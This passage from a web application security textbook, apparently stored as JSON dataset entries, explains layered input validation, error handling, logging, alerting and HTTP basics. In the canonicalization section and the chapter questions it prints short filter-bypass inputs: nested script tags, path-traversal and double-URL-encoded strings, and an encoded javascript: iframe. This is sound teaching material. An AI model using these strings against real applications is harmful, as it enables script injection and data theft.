data. It would be very diffi cult to devise a single\nmechanism at the external boundary to defend against all these attacks.\nn Many application functions involve chaining together a series of different\ntypes of processing. A single piece of user-supplied input might result in\na number of operations in different components, with the output of each\nbeing used as the input for the next. As the data is transformed, it might\ncome to bear no resemblance to the original input. A skilled attacker\nmay be able to manipulate the application to cause malicious input to be\ngenerated at a key stage of the processing, attacking the component that\nreceives this data. It would be extremely diffi cult to implement a valida-\ntion mechanism at the external boundary to foresee all the possible results\nof processing each piece of user input.\nn Defending against different categories of input-based attack may entail\nperforming different validation checks on user input that are incompat-\nible with one another. For example, preventing cross-site scripting attacks\nmay require the application to HTML-encode the > character as &gt;, and\npreventing command injection attacks may require the application to\nblock input containing the & and ; characters. Attempting to prevent all\ncategories of attack simultaneously at the application’s external boundary\nmay sometimes be impossible.\nA more effective model uses the concept of boundaryvalidation. Here, each\nindividual component or functional unit of the server-side application treats\nits inputs as coming from a potentially malicious source. Data validation is\nperformed at each of these trust boundaries, in addition to the external frontier\nbetween the client and server. This model provides a solution to the problems\njust described. Each component can defend itself against the specifi c types of\ncrafted input to which it may be vulnerable. As data passes through different\ncc0022..iinndddd 2266 88//1199//22001111 1122::0022::4422 PPMM\nStuttard c02.indd V3 - 07/22/2011 Page 27\nChapter 2 n Core Defense Mechanisms 27\ncomponents, validation checks can be performed against whatever value the data\nhas as a result of previous transformations. And because the various validation\nchecks are implemented at different stages of processing, they are unlikely to\ncome into confl ict with one another.\nFigure 2-5 illustrates a typical situation where boundary validation is the\nmost effective approach to defending against malicious input. The user login\nresults in several steps of processing being performed on user-supplied input,\nand suitable validation is performed at each step:\n1. The application receives the user’s login details. The form handler vali-\ndates that each item of input contains only permitted characters, is within\na specifi c length limit, and does not contain any known attack signatures.\n2. The application performs a SQL query to verify the user’s credentials.\nTo prevent SQL injection attacks, any characters within the user input\nthat may be used to attack the database are escaped before the query is\nconstructed.\n3. If the login succeeds, the application passes certain data from the user’s\nprofi le to a SOAP service to retrieve further information about her account.\nTo prevent SOAP injection attacks, any XML metacharacters within the\nuser’s profi le data are suitably encoded.\n4. The application displays the user’s account information back to the user’s\nbrowser. To prevent cross-site scripting attacks, the application HTML-\nencodes any user-supplied data that is embedded into the returned page.\n2. Clean SQL\n1. General checks\nSQL query\nLogin submission\nDatabase\nDisplay account details\nUser\nApplication\nserver\n3. Encode XML\n4. Sanitize output\nmetacharacters\nSOAP\nmessage\nSOAP service\nFigure 2-5: An application function using boundary validation at multiple stages of\nprocessing\ncc0022..iinndddd 2277 88//1199//22001111 1122::0022::4422 PPMM"
  },
  {
    "input": "Multistep Validation and Canonicalization",
    "output": "Stuttard c02.indd V3 - 07/22/2011 Page 28\n28 Chapter 2 n Core Defense Mechanisms\nThe specifi c vulnerabilities and defenses involved in this scenario will be\nexamined in detail in later chapters. If variations on this functionality involved\npassing data to further application components, similar defenses would need\nto be implemented at the relevant trust boundaries. For example, if a failed\nlogin caused the application to send a warning e-mail to the user, any user\ndata incorporated into the e-mail may need to be checked for SMTP injection\nattacks.\nMultistep Validation and Canonicalization\nA common problem encountered by input-handling mechanisms arises when\nuser-supplied input is manipulated across several steps as part of the valida-\ntion logic. If this process is not handled carefully, an attacker may be able to\nconstruct crafted input that succeeds in smuggling malicious data through the\nvalidation mechanism. One version of this problem occurs when an application\nattempts to sanitize user input by removing or encoding certain characters or\nexpressions. For example, an application may attempt to defend against some\ncross-site scripting attacks by stripping the expression:\n<script>\nfrom any user-supplied data. However, an attacker may be able to bypass the\nfi lter by supplying the following input:\n<scr<script>ipt>\nWhen the blocked expression is removed, the surrounding data contracts\nto restore the malicious payload, because the filter is not being applied\nrecursively.\nSimilarly, if more than one validation step is performed on user input, an\nattacker may be able to exploit the ordering of these steps to bypass the fi lter.\nFor example, if the application fi rst removes ../ recursively and then removes\n..\\ recursively, the following input can be used to defeat the validation:\n....\\/\nA related problem arises in relation to data canonicalization. When input\nis sent from the user’s browser, it may be encoded in various ways. These\nencoding schemes exist so that unusual characters and binary data may be\ntransmitted safely over HTTP (see Chapter 3 for more details). Canonicalization\nis the process of converting or decoding data into a common character set. If\nany canonicalization is carried out after input fi lters have been applied, an\nattacker may be able to use a suitable encoding scheme to bypass the valida-\ntion mechanism.\nFor example, an application may attempt to defend against some SQL injec-\ntion attacks by blocking input containing the apostrophe character. However, if\ncc0022..iinndddd 2288 88//1199//22001111 1122::0022::4433 PPMM\nStuttard c02.indd V3 - 07/22/2011 Page 29\nChapter 2 n Core Defense Mechanisms 29\nthe input is subsequently canonicalized, an attacker may be able to use double\nURL encoding to defeat the fi lter. For example:\n%2527\nWhen this input is received, the application server performs its normal URL\ndecode, so the input becomes:\n%27\nThis does not contain an apostrophe, so it is permitted by the application’s fi lters.\nBut when the application performs a further URL decode, the input is converted\ninto an apostrophe, thereby bypassing the fi lter.\nIf the application strips the apostrophe instead of blocking it, and then per-\nforms further canonicalization, the following bypass may be effective:\n%%2727\nIt is worth noting that the multiple validation and canonicalization steps\nin these cases need not all take place on the server side of the application. For\nexample, in the following input several characters have been HTML-encoded:\n<iframe src=j&#x61;vasc&#x72ipt&#x3a;alert&#x28;1&#x29; >\nIf the server-side application uses an input fi lter to block certain JavaScript\nexpressions and characters, the encoded input may succeed in bypassing the\nfi lter. However, if the input is then copied into the application’s response, some\nbrowsers perform an HTML decode of the src parameter value, and the embed-\nded JavaScript executes.\nIn addition to the standard encoding schemes that are intended for use in\nweb applications, canonicalization issues can arise in other situations where a\ncomponent employed by the application converts data from one character set\nto another. For example, some technologies perform a “best fi t” mapping of\ncharacters based on similarities in their printed glyphs. Here, the characters «\nand » may be converted into < and >, respectively, and Ÿ and Â are converted\ninto Y and A. This behavior can often be leveraged to smuggle blocked characters\nor keywords past an application’s input fi lters.\nThroughout this book, we will describe numerous attacks of this kind, which\nare effective in defeating many applications’ defenses against common input-\nbased vulnerabilities.\nAvoiding problems with multistep validation and canonicalization can some-\ntimes be diffi cult, and there is no single solution to the problem. One approach is\nto perform sanitization steps recursively, continuing until no further modifi cations\nhave been made on an item of input. However, where the desired sanitization\ninvolves escaping a problematic character, this may result in an infi nite loop.\nOften, the problem can be addressed only on a case-by-case basis, based on the\ntypes of validation being performed. Where feasible, it may be preferable to avoid\nattempting to clean some kinds of bad input, and simply reject it altogether.\ncc0022..iinndddd 2299 88//1199//22001111 1122::0022::4433 PPMM"
  },
  {
    "input": "Handling Errors",
    "output": "Stuttard c02.indd V3 - 07/22/2011 Page 30\n30 Chapter 2 n Core Defense Mechanisms\nHandling Attackers\nAnyone designing an application for which security is remotely important must\nassume that it will be directly targeted by dedicated and skilled attackers. A key\nfunction of the application’s security mechanisms is being able to handle and\nreact to these attacks in a controlled way. These mechanisms often incorporate\na mix of defensive and offensive measures designed to frustrate an attacker as\nmuch as possible and give the application’s owners appropriate notifi cation and\nevidence of what has taken place. Measures implemented to handle attackers\ntypically include the following tasks:\nn Handling errors\nn Maintaining audit logs\nn Alerting administrators\nn Reacting to attacks\nHandling Errors\nHowever careful an application’s developers are when validating user input, it\nis virtually inevitable that some unanticipated errors will occur. Errors resulting\nfrom the actions of ordinary users are likely to be identifi ed during functional-\nity and user acceptance testing. Therefore, they are taken into account before\nthe application is deployed in a production context. However, it is diffi cult to\nanticipate every possible way in which a malicious user may interact with the\napplication, so further errors should be expected when the application comes\nunder attack.\nA key defense mechanism is for the application to handle unexpected errors\ngracefully, and either recover from them or present a suitable error message\nto the user. In a production context, the application should never return any\nsystem-generated messages or other debug information in its responses. As\nyou will see throughout this book, overly verbose error messages can greatly\nassist malicious users in furthering their attacks against the application. In some\nsituations, an attacker can leverage defective error handling to retrieve sensi-\ntive information within the error messages themselves, providing a valuable\nchannel for stealing data from the application. Figure 2-6 shows an example of\nan unhandled error resulting in a verbose error message.\nMost web development languages provide good error-handling support\nthrough try-catch blocks and checked exceptions. Application code should\nmake extensive use of these constructs to catch specifi c and general errors and\nhandle them appropriately. Furthermore, most application servers can be con-\nfi gured to deal with unhandled application errors in customized ways, such as\ncc0022..iinndddd 3300 88//1199//22001111 1122::0022::4433 PPMM"
  },
  {
    "input": "Maintaining Audit Logs",
    "output": "Stuttard c02.indd V3 - 07/22/2011 Page 31\nChapter 2 n Core Defense Mechanisms 31\nby presenting an uninformative error message. See Chapter 15 for more details\non these measures.\nFigure 2-6: An unhandled error\nEffective error handling is often integrated with the application’s logging\nmechanisms, which record as much debug information as possible about unan-\nticipated errors. Unexpected errors often point to defects within the application’s\ndefenses that can be addressed at the source if the application’s owner has the\nrequired information.\nMaintaining Audit Logs\nAudit logs are valuable primarily when investigating intrusion attempts against\nan application. Following such an incident, effective audit logs should enable\nthe application’s owners to understand exactly what has taken place, which\nvulnerabilities (if any) were exploited, whether the attacker gained unauthorized\naccess to data or performed any unauthorized actions, and, as far as possible,\nprovide evidence of the intruder’s identity.\ncc0022..iinndddd 3311 88//1199//22001111 1122::0022::4433 PPMM\nStuttard c02.indd V3 - 07/22/2011 Page 32\n32 Chapter 2 n Core Defense Mechanisms\nIn any application for which security is important, key events should be logged\nas a matter of course. At a minimum, these typically include the following:\nn All events relating to the authentication functionality, such as successful\nand failed login, and change of password\nn Key transactions, such as credit card payments and funds transfers\nn Access attempts that are blocked by the access control mechanisms\nn Any requests containing known attack strings that indicate overtly mali-\ncious intentions\nIn many security-critical applications, such as those used by online banks,\nevery client request is logged in full, providing a complete forensic record that\ncan be used to investigate any incidents.\nEffective audit logs typically record the time of each event, the IP address\nfrom which the request was received, and the user’s account (if authenticated).\nSuch logs need to be strongly protected against unauthorized read or write\naccess. An effective approach is to store audit logs on an autonomous system\nthat accepts only update messages from the main application. In some situa-\ntions, logs may be fl ushed to write-once media to ensure their integrity in the\nevent of a successful attack.\nIn terms of attack surface, poorly protected audit logs can provide a gold mine\nof information to an attacker, disclosing a host of sensitive information such as\nsession tokens and request parameters. This information may enable the attacker\nto immediately compromise the entire application, as shown in Figure 2-7.\nFigure 2-7: Poorly protected application logs containing sensitive information\nsubmitted by other users\ncc0022..iinndddd 3322 88//1199//22001111 1122::0022::4433 PPMM"
  },
  {
    "input": "Alerting Administrators",
    "output": "Stuttard c02.indd V3 - 07/22/2011 Page 33\nChapter 2 n Core Defense Mechanisms 33\nAlerting Administrators\nAudit logs enable an application’s owners to retrospectively investigate intrusion\nattempts and, if possible, take legal action against the perpetrator. However, in\nmany situations it is desirable to take much more immediate action, in real time,\nin response to attempted attacks. For example, administrators may block the IP\naddress or user account an attacker is using. In extreme cases, they may even\ntake the application offl ine while investigating the attack and taking remedial\naction. Even if a successful intrusion has already occurred, its practical effects\nmay be mitigated if defensive action is taken at an early stage.\nIn most situations, alerting mechanisms must balance the confl icting objec-\ntives of reporting each genuine attack reliably and of not generating so many\nalerts that these come to be ignored. A well-designed alerting mechanism can\nuse a combination of factors to diagnose that a determined attack is under way\nand can aggregate related events into a single alert where possible. Anomalous\nevents monitored by alerting mechanisms often include the following:\nn Usage anomalies, such as large numbers of requests being received from\na single IP address or user, indicating a scripted attack\nn Business anomalies, such as an unusual number of funds transfers being\nmade to or from a single bank account\nn Requests containing known attack strings\nn Requests where data that is hidden from ordinary users has been modifi ed\nSome of these functions can be provided reasonably well by off-the-shelf\napplication fi rewalls and intrusion detection products. These typically use a\nmixture of signature- and anomaly-based rules to identify malicious use of\nthe application and may reactively block malicious requests as well as issue\nalerts to administrators. These products can form a valuable layer of defense\nprotecting a web application, particularly in the case of existing applications\nknown to contain problems but where resources to fi x these are not immedi-\nately available. However, their effectiveness usually is limited by the fact that\neach web application is different, so the rules employed are inevitably generic\nto some extent. Web application fi rewalls usually are good at identifying the\nmost obvious attacks, where an attacker submits standard attack strings in\neach request parameter. However, many attacks are more subtle than this. For\nexample, perhaps they modify the account number in a hidden fi eld to access\nanother user’s data, or submit requests out of sequence to exploit defects in the\napplication’s logic. In these cases, a request submitted by an attacker may be\ncc0022..iinndddd 3333 88//1199//22001111 1122::0022::4433 PPMM"
  },
  {
    "input": "Reacting to Attacks",
    "output": "Stuttard c02.indd V3 - 07/22/2011 Page 34\n34 Chapter 2 n Core Defense Mechanisms\nidentical to that submitted by a benign user. What makes it malicious are the\ncircumstances under which it is made.\nIn any security-critical application, the most effective way to implement real-\ntime alerting is to integrate this tightly with the application’s input validation\nmechanisms and other controls. For example, if a cookie is expected to have\none of a specifi c set of values, any violation of this indicates that its value has\nbeen modifi ed in a way that is not possible for ordinary users of the application.\nSimilarly, if a user changes an account number in a hidden fi eld to identify a\ndifferent user’s account, this strongly indicates malicious intent. The application\nshould already be checking for these attacks as part of its primary defenses,\nand these protective mechanisms can easily hook into the application’s alert-\ning mechanism to provide fully customized indicators of malicious activity.\nBecause these checks have been tailored to the application’s actual logic, with\na fi ne-grained knowledge of how ordinary users should be behaving, they\nare much less prone to false positives than any off-the-shelf solution, however\nconfi gurable or easy-to-learn that solution may be.\nReacting to Attacks\nIn addition to alerting administrators, many security-critical applications con-\ntain built-in mechanisms to react defensively to users who are identifi ed as\npotentially malicious.\nBecause each application is different, most real-world attacks require an\nattacker to probe systematically for vulnerabilities, submitting numerous requests\ncontaining crafted input designed to indicate the presence of various common\nvulnerabilities. Effective input validation mechanisms will identify many of\nthese requests as potentially malicious and block the input from having any\nundesirable effect on the application. However, it is sensible to assume that\nsome bypasses to these fi lters exist and that the application does contain some\nactual vulnerabilities waiting to be discovered and exploited. At some point, an\nattacker working systematically is likely to discover these defects.\nFor this reason, some applications take automatic reactive measures to frus-\ntrate the activities of an attacker who is working in this way. For example, they\nmight respond increasingly slowly to the attacker’s requests or terminate the\nattacker’s session, requiring him to log in or perform other steps before con-\ntinuing the attack. Although these measures will not defeat the most patient\nand determined attacker, they will deter many more casual attackers and will\nbuy additional time for administrators to monitor the situation and take more\ndrastic action if desired.\ncc0022..iinndddd 3344 88//1199//22001111 1122::0022::4433 PPMM"
  },
  {
    "input": "Managing the Application",
    "output": "Stuttard c02.indd V3 - 07/22/2011 Page 35\nChapter 2 n Core Defense Mechanisms 35\nReacting to apparent attackers is not, of course, a substitute for fi xing any\nvulnerabilities that exist within the application. However, in the real world, even\nthe most diligent efforts to purge an application of security fl aws may leave\nsome exploitable defects. Placing further obstacles in the way of an attacker\nis an effective defense-in-depth measure that reduces the likelihood that any\nresidual vulnerabilities will be found and exploited.\nManaging the Application\nAny useful application needs to be managed and administered. This facility\noften forms a key part of the application’s security mechanisms, providing a\nway for administrators to manage user accounts and roles, access monitoring\nand audit functions, perform diagnostic tasks, and confi gure aspects of the\napplication’s functionality.\nIn many applications, administrative functions are implemented within\nthe application itself, accessible through the same web interface as its core\nnonsecurity functionality, as shown in Figure 2-8. Where this is the case, the\nadministrative mechanism represents a critical part of the application’s attack\nsurface. Its primary attraction for an attacker is as a vehicle for privilege esca-\nlation. For example:\nn Weaknesses in the authentication mechanism may enable an attacker\nto gain administrative access, effectively compromising the entire\napplication.\nn Many applications do not implement effective access control of some of\ntheir administrative functions. An attacker may fi nd a means of creating\na new user account with powerful privileges.\nn Administrative functionality often involves displaying data that originated\nfrom ordinary users. Any cross-site scripting fl aws within the administra-\ntive interface can lead to compromise of a user session that is guaranteed\nto have powerful privileges.\nn Administrative functionality is often subjected to less rigorous security\ntesting, because its users are deemed to be trusted, or because penetration\ntesters are given access to only low-privileged accounts. Furthermore, the\nfunctionality often needs to perform inherently dangerous operations,\ninvolving access to fi les on disk or operating system commands. If an\nattacker can compromise the administrative function, he can often lever-\nage it to take control of the entire server.\ncc0022..iinndddd 3355 88//1199//22001111 1122::0022::4433 PPMM"
  },
  {
    "input": "Questions",
    "output": "Stuttard c02.indd V3 - 07/22/2011 Page 36\n36 Chapter 2 n Core Defense Mechanisms\nFigure 2-8: An administrative interface within a web application\nSummary\nDespite their extensive differences, virtually all web applications employ the\nsame core security mechanisms in some shape or form. These mechanisms rep-\nresent an application’s primary defenses against malicious users and therefore\nalso comprise the bulk of the application’s attack surface. The vulnerabilities\nwe will examine later in this book mainly arise from defects within these core\nmechanisms.\nOf these components, the mechanisms for handling user access and user input\nare the most important and should receive most of your attention when you are\ntargeting an application. Defects in these mechanisms often lead to complete\ncompromise of the application, enabling you to access data belonging to other\nusers, perform unauthorized actions, and inject arbitrary code and commands.\nQuestions\nAnswers can be found at http://mdsec.net/wahh.\n1. Why are an application’s mechanisms for handling user access only as\nstrong as the weakest of these components?\n2. What is the difference between a session and a session token?\n3. Why is it not always possible to use a whitelist-based approach to input\nvalidation?\ncc0022..iinndddd 3366 88//1199//22001111 1122::0022::4433 PPMM\nStuttard c02.indd V3 - 07/22/2011 Page 37\nChapter 2 n Core Defense Mechanisms 37\n4. You are attacking an application that implements an administrative func-\ntion. You do not have any valid credentials to use the function. Why should\nyou nevertheless pay close attention to it?\n5. An input validation mechanism designed to block cross-site scripting\nattacks performs the following sequence of steps on an item of input:\n1. Strip any <script> expressions that appear.\n2. Truncate the input to 50 characters.\n3. Remove any quotation marks within the input.\n4. URL-decode the input.\n5. If any items were deleted, return to step 1.\nCan you bypass this validation mechanism to smuggle the following data\npast it?\n“><script>alert(“foo”)</script>\ncc0022..iinndddd 3377 88//1199//22001111 1122::0022::4444 PPMM\nStuttard c02.indd V3 - 07/22/2011 Page 38\ncc0022..iinndddd 3388 88//1199//22001111 1122::0022::4444 PPMM"
  },
  {
    "input": "The HTTP Protocol",
    "output": "Stuttard c03.indd V3 - 07/22/2011 Page 39\nCHAPTER\n3\nWeb Application Technologies\nWeb applications employ a myriad of technologies to implement their function-\nality. This chapter is a short primer on the key technologies that you are likely\nto encounter when attacking web applications. We will examine the HTTP\nprotocol, the technologies commonly employed on the server and client sides,\nand the encoding schemes used to represent data in different situations. These\ntechnologies are in general easy to understand, and a grasp of their relevant\nfeatures is key to performing effective attacks against web applications.\nIf you are already familiar with the key technologies used in web applications,\nyou can skim through this chapter to confi rm that it offers you nothing new. If\nyou are still learning how web applications work, you should read this chapter\nbefore continuing to the later chapters on specifi c vulnerabilities. For further\nreading on many of the areas covered, we recommend HTTP: The Defi nitive\nGuide by David Gourley and Brian Totty (O’Reilly, 2002), and also the website\nof the World Wide Web Consortium at www.w3.org.\nThe HTTP Protocol\nHypertext transfer protocol (HTTP) is the core communications protocol used to\naccess the World Wide Web and is used by all of today’s web applications. It is\na simple protocol that was originally developed for retrieving static text-based\nresources. It has since been extended and leveraged in various ways to enable\nit to support the complex distributed applications that are now commonplace.\n39\ncc0033..iinndddd 3399 88//1199//22001111 1122::0033::4433 PPMM"
  },
  {
    "input": "HTTP Requests",
    "output": "Stuttard c03.indd V3 - 07/22/2011 Page 40\n40 Chapter 3 n Web Application Technologies\nHTTP uses a message-based model in which a client sends a request mes-\nsage and the server returns a response message. The protocol is essentially\nconnectionless: although HTTP uses the stateful TCP protocol as its transport\nmechanism, each exchange of request and response is an autonomous transac-\ntion and may use a different TCP connection.\nHTTP Requests\nAll HTTP messages (requests and responses) consist of one or more headers,\neach on a separate line, followed by a mandatory blank line, followed by an\noptional message body. A typical HTTP request is as follows:\nGET /auth/488/YourDetails.ashx?uid=129 HTTP/1.1\nAccept: application/x-ms-application, image/jpeg, application/xaml+xml,\nimage/gif, image/pjpeg, application/x-ms-xbap, application/x-shockwave-\nflash, */*\nReferer: https://mdsec.net/auth/488/Home.ashx\nAccept-Language: en-GB\nUser-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64;\nTrident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR\n3.0.30729; .NET4.0C; InfoPath.3; .NET4.0E; FDM; .NET CLR 1.1.4322)\nAccept-Encoding: gzip, deflate\nHost: mdsec.net\nConnection: Keep-Alive\nCookie: SessionId=5B70C71F3FD4968935CDB6682E545476\nThe fi rst line of every HTTP request consists of three items, separated by spaces:\nn A verb indicating the HTTP method. The most commonly used method\nisGET, whose function is to retrieve a resource from the web server. GET\nrequests do not have a message body, so no further data follows the blank\nline after the message headers.\nn The requested URL. The URL typically functions as a name for the resource\nbeing requested, together with an optional query string containing param-\neters that the client is passing to that resource. The query string is indicated\nby the ? character in the URL. The example contains a single parameter\nwith the name uid and the value 129.\nn The HTTP version being used. The only HTTP versions in common use\non the Internet are 1.0 and 1.1, and most browsers use version 1.1 by\ndefault. There are a few differences between the specifi cations of these\ntwo versions; however, the only difference you are likely to encounter\nwhen attacking web applications is that in version 1.1 the Host request\nheader is mandatory.\ncc0033..iinndddd 4400 88//1199//22001111 1122::0033::4433 PPMM"
  },
  {
    "input": "HTTP Responses",
    "output": "Stuttard c03.indd V3 - 07/22/2011 Page 41\nChapter 3 n Web Application Technologies 41\nHere are some other points of interest in the sample request:\nn TheReferer header is used to indicate the URL from which the request\noriginated (for example, because the user clicked a link on that page).\nNote that this header was misspelled in the original HTTP specifi cation,\nand the misspelled version has been retained ever since.\nn TheUser-Agent header is used to provide information about the browser\nor other client software that generated the request. Note that most brows-\ners include the Mozilla prefi x for historical reasons. This was the User-\nAgent string used by the originally dominant Netscape browser, and other\nbrowsers wanted to assert to websites that they were compatible with this\nstandard. As with many quirks from computing history, it has become so\nestablished that it is still retained, even on the current version of Internet\nExplorer, which made the request shown in the example.\nn The Host header specifi es the hostname that appeared in the full URL\nbeing accessed. This is necessary when multiple websites are hosted on\nthe same server, because the URL sent in the fi rst line of the request usu-\nally does not contain a hostname. (See Chapter 17 for more information\nabout virtually hosted websites.)\nn The Cookie header is used to submit additional parameters that the server\nhas issued to the client (described in more detail later in this chapter).\nHTTP Responses\nA typical HTTP response is as follows:\nHTTP/1.1 200 OK\nDate: Tue, 19 Apr 2011 09:23:32 GMT\nServer: Microsoft-IIS/6.0\nX-Powered-By: ASP.NET\nSet-Cookie: tracking=tI8rk7joMx44S2Uu85nSWc\nX-AspNet-Version: 2.0.50727\nCache-Control: no-cache\nPragma: no-cache\nExpires: Thu, 01 Jan 1970 00:00:00 GMT\nContent-Type: text/html; charset=utf-8\nContent-Length: 1067\n<!DOCTYPE html PUBLIC “-//W3C//DTD XHTML 1.0 Transitional//EN” “http://\nwww.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd”><html xmlns=”http://\nwww.w3.org/1999/xhtml” ><head><title>Your details</title>\n...\ncc0033..iinndddd 4411 88//1199//22001111 1122::0033::4433 PPMM"
  },
  {
    "input": "HTTP Methods",
    "output": "Stuttard c03.indd V3 - 07/22/2011 Page 42\n42 Chapter 3 n Web Application Technologies\nThe fi rst line of every HTTP response consists of three items, separated by\nspaces:\nn The HTTP version being used.\nn A numeric status code indicating the result of the request. 200 is the most\ncommon status code; it means that the request was successful and that\nthe requested resource is being returned.\nn A textual “reason phrase” further describing the status of the response. This\ncan have any value and is not used for any purpose by current browsers.\nHere are some other points of interest in the response:\nn TheServer header contains a banner indicating the web server software\nbeing used, and sometimes other details such as installed modules and\nthe server operating system. The information contained may or may not\nbe accurate.\nn TheSet-Cookie header issues the browser a further cookie; this is sub-\nmitted back in the Cookie header of subsequent requests to this server.\nn ThePragma header instructs the browser not to store the response in its\ncache. The Expires header indicates that the response content expired\nin the past and therefore should not be cached. These instructions are\nfrequently issued when dynamic content is being returned to ensure\nthat browsers obtain a fresh version of this content on subsequent\noccasions.\nn Almost all HTTP responses contain a message body following the blank\nline after the headers. The Content-Type header indicates that the body\nof this message contains an HTML document.\nn The Content-Length header indicates the length of the message body in\nbytes.\nHTTP Methods\nWhen you are attacking web applications, you will be dealing almost exclusively\nwith the most commonly used methods: GET and POST. You need to be aware\nof some important differences between these methods, as they can affect an\napplication’s security if overlooked.\nThe GET method is designed to retrieve resources. It can be used to send\nparameters to the requested resource in the URL query string. This enables\nusers to bookmark a URL for a dynamic resource that they can reuse. Or other\nusers can retrieve the equivalent resource on a subsequent occasion (as in a\nbookmarked search query). URLs are displayed on-screen and are logged in\nvarious places, such as the browser history and the web server’s access logs.\nThey are also transmitted in the Referer header to other sites when external\ncc0033..iinndddd 4422 88//1199//22001111 1122::0033::4433 PPMM\nStuttard c03.indd V3 - 07/22/2011 Page 43\nChapter 3 n Web Application Technologies 43\nlinks are followed. For these reasons, the query string should not be used to\ntransmit any sensitive information.\nThe POST method is designed to perform actions. With this method, request\nparameters can be sent both in the URL query string and in the body of the\nmessage. Although the URL can still be bookmarked, any parameters sent in\nthe message body will be excluded from the bookmark. These parameters will\nalso be excluded from the various locations in which logs of URLs are main-\ntained and from the Referer header. Because the POST method is designed for\nperforming actions, if a user clicks the browser’s Back button to return to a\npage that was accessed using this method, the browser does not automatically\nreissue the request. Instead, it warns the user of what it is about to do, as shown\nin Figure 3-1. This prevents users from unwittingly performing an action more\nthan once. For this reason, POST requests should always be used when an action\nis being performed.\nFigure 3-1: Browsers do not automatically reissue POST requests made by\nusers, because these might cause an action to be performed more than once\nIn addition to the GET and POST methods, the HTTP protocol supports numer-\nous other methods that have been created for specifi c purposes. Here are the\nother ones you are most likely to require knowledge of:\nn HEAD functions in the same way as a GET request, except that the server\nshould not return a message body in its response. The server should return\nthe same headers that it would have returned to the corresponding GET\nrequest. Hence, this method can be used to check whether a resource is\npresent before making a GET request for it.\nn TRACE is designed for diagnostic purposes. The server should return in the\nresponse body the exact contents of the request message it received. This\ncan be used to detect the effect of any proxy servers between the client\nand server that may manipulate the request.\nn OPTIONS asks the server to report the HTTP methods that are available for\na particular resource. The server typically returns a response containing\nanAllow header that lists the available methods.\nn PUT attempts to upload the specifi ed resource to the server, using the con-\ntent contained in the body of the request. If this method is enabled, you\nmay be able to leverage it to attack the application, such as by uploading\nan arbitrary script and executing it on the server.\ncc0033..iinndddd 4433 88//1199//22001111 1122::0033::4444 PPMM"
  },
  {
    "input": "REST",
    "output": "Stuttard c03.indd V3 - 07/22/2011 Page 44\n44 Chapter 3 n Web Application Technologies\nMany other HTTP methods exist that are not directly relevant to attacking\nweb applications. However, a web server may expose itself to attack if certain\ndangerous methods are available. See Chapter 18 for further details on these\nmethods and examples of using them in an attack.\nURLs\nA uniform resource locator (URL) is a unique identifi er for a web resource through\nwhich that resource can be retrieved. The format of most URLs is as follows:\nprotocol://hostname[:port]/[path/]file[?param=value]\nSeveral components in this scheme are optional. The port number usually is\nincluded only if it differs from the default used by the relevant protocol. The\nURL used to generate the HTTP request shown earlier is as follows:\nhttps://mdsec.net/auth/488/YourDetails.ashx?uid=129\nIn addition to this absolute form, URLs may be specifi ed relative to a particular\nhost, or relative to a particular path on that host. For example:\n/auth/488/YourDetails.ashx?uid=129\nYourDetails.ashx?uid=129\nThese relative forms are often used in web pages to describe navigation within\nthe website or application itself.\nNOTE You may encounter the term URI (or uniform resource identifi er)\nbeing used instead of URL, but it is really only used in formal specifi cations\nand by those who want to exhibit their pedantry.\nREST\nRepresentational state transfer (REST) is a style of architecture for distributed\nsystems in which requests and responses contain representations of the current\nstate of the system’s resources. The core technologies employed in the World\nWide Web, including the HTTP protocol and the format of URLs, conform to\nthe REST architectural style.\nAlthough URLs containing parameters within the query string do themselves\nconform to REST constraints, the term “REST-style URL” is often used to signify\na URL that contains its parameters within the URL fi le path, rather than the\nquery string. For example, the following URL containing a query string:\nhttp://wahh-app.com/search?make=ford&model=pinto\ncorresponds to the following URL containing “REST-style” parameters:\nhttp://wahh-app.com/search/ford/pinto\ncc0033..iinndddd 4444 88//1199//22001111 1122::0033::4444 PPMM"
  },
  {
    "input": "HTTP Headers",
    "output": "Stuttard c03.indd V3 - 07/22/2011 Page 45\nChapter 3 n Web Application Technologies 45\nChapter 4 describes how you need to consider these different parameter styles\nwhen mapping an application’s content and functionality and identifying its\nkey attack surface.\nHTTP Headers\nHTTP supports a large number of headers, some of which are designed for\nspecifi c unusual purposes. Some headers can be used for both requests and\nresponses, and others are specifi c to one of these message types. The following\nsections describe the headers you are likely to encounter when attacking web\napplications.\nGeneral Headers\nn Connection tells the other end of the communication whether it should\nclose the TCP connection after the HTTP transmission has completed or\nkeep it open for further messages.\nn Content-Encoding specifi es what kind of encoding is being used for the\ncontent contained in the message body, such as gzip, which is used by\nsome applications to compress responses for faster transmission.\nn Content-Length specifi es the length of the message body, in bytes (except\nin the case of responses to HEAD requests, when it indicates the length of\nthe body in the response to the corresponding GET request).\nn Content-Type specifi es the type of content contained in the message body,\nsuch as text/html for HTML documents.\nn Transfer-Encoding specifi es any encoding that was performed on the\nmessage body to facilitate its transfer over HTTP. It is normally used to\nspecify chunked encoding when this is employed.\nRequest Headers\nn Accept tells the server what kinds of content the client is willing to accept,\nsuch as image types, offi ce document formats, and so on.\nn Accept-Encoding tells the server what kinds of content encoding the client\nis willing to accept.\nn Authorization submits credentials to the server for one of the built-in\nHTTP authentication types.\nn Cookie submits cookies to the server that the server previously issued.\nn Host specifi es the hostname that appeared in the full URL being requested.\ncc0033..iinndddd 4455 88//1199//22001111 1122::0033::4444 PPMM\nStuttard c03.indd V3 - 07/22/2011 Page 46\n46 Chapter 3 n Web Application Technologies\nn If-Modified-Since specifi es when the browser last received the requested\nresource. If the resource has not changed since that time, the server may\ninstruct the client to use its cached copy, using a response with status code 304.\nn If-None-Match specifi es an entitytag, which is an identifi er denoting the\ncontents of the message body. The browser submits the entity tag that\nthe server issued with the requested resource when it was last received.\nThe server can use the entity tag to determine whether the browser may\nuse its cached copy of the resource.\nn Origin is used in cross-domain Ajax requests to indicate the domain from\nwhich the request originated (see Chapter 13).\nn Referer specifi es the URL from which the current request originated.\nn User-Agent provides information about the browser or other client soft-\nware that generated the request.\nResponse Headers\nn Access-Control-Allow-Origin indicates whether the resource can be\nretrieved via cross-domain Ajax requests (see Chapter 13).\nn Cache-Control passes caching directives to the browser (for example,\nno-cache).\nn ETag specifi es an entity tag. Clients can submit this identifi er in future\nrequests for the same resource in the If-None-Match header to notify the\nserver which version of the resource the browser currently holds in its cache.\nn Expires tells the browser for how long the contents of the message body\nare valid. The browser may use the cached copy of 